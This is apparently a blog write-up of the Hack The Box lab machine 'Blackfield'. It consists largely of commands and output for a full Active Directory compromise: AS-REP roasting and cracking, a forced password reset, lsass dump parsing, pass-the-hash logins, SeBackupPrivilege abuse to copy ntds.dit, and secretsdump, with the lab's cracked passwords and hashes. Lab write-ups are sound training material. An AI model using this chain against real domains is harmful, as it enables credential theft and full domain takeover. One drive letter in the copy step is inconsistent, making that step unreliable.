---
layout: post
title: Hack the Box - Blackfield
author: Kolja
categories: [HtB]
tags: [ad]
---

## Enumeration
We can enumerate smb with the guest user:
```
smbmap -H 10.10.10.192 -u "guest" -p ""
[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      
        Disk                                                    Permissions Comment
        ----                                                    ----------- -------
        ADMIN$                                                  NO ACCESS   Remote Admin
        C$                                                      NO ACCESS   Default share
        forensic                                                NO ACCESS   Forensic / Audit share.
        IPC$                                                    READ ONLY   Remote IPC
        NETLOGON                                                NO ACCESS   Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS   Logon server share 
       
```

## Foothold
From the profiles share we get directories for the existing users. We can use this to create a user list and then try to do AS-REP Roasting:
```
impacket-GetNPUsers  -dc-ip 10.10.10.192 blackfield.local/ -usersfile  userlist.txt -format john -outputfile hashes -no-pass
```
We get one hash and can try to crack it using john:
```
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)     
1g 0:00:00:10 DONE (2022-05-24 07:05) 0.09165g/s 1313Kp/s 1313Kc/s 1313KC/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So we have credentials now: `support:#00^BlackKnight`

## Privilege Escalation
Now we have credentials we can enumerate the active directory:
```
bloodhound-python -c All -u support@blackfield.local -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -dc DC01.blackfield.local
```
Our user can change the password of another user:
![[Pasted image 20220524143452.png]]


This can be done from Linux using `rpcclient`:
```
rpcclient -U blackfield/support 10.10.10.192
Password for [BLACKFIELD\support]:
rpcclient $> setuserinfo2 AUDIT2020 23 Passwort123!
rpcclient $> 
```

This user had no interesting bloodhound edges, but it had read access to the forensic share:
```
smbmap -H 10.10.10.192 -u "AUDIT2020" -p 'Passwort123!'   
[+] IP: 10.10.10.192:445        Name: blackfield.local                                  
        Disk                                                    Permissions Comment
        ----                                                    ----------- -------
        ADMIN$                                                  NO ACCESS   Remote Admin
        C$                                                      NO ACCESS   Default share
        forensic                                                READ ONLY   Forensic / Audit share.
        IPC$                                                    READ ONLY   Remote IPC
        NETLOGON                                                READ ONLY   Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY   Logon server share 
```

There is a lsass.zip file on the share, which contains a lsass.DMP file.
```
pypykatz lsa minidump lsass.DMP 
```

There is a NTLM hash for the `svc_backup` user in the dump: `9658d1d1dcd9250115e2205d9f48400d`

We can use `evil-winrm` to log in with this user:
```
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

Here we execute `PrivescCheck.ps1` and see that we have the `SeBackupPrivilege`. We can exploit this as described [here](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

First, we create a file `raj.dsh`:
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```
After using `unix2dos` on the file we upload this file to the host and then use it:
```
diskshadow /s raj.dsh
robocopy /b x:\windows\ntds . ntds.dit
```
We also need the `system` registry value:
```
reg save hklm\system c:\Temp\system
```

We can then use secretsdump to extract the hashes:
```
impacket-secretsdump -ntds ntds.dit -system system local
```

Now we can log in using the admin account:
```
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```
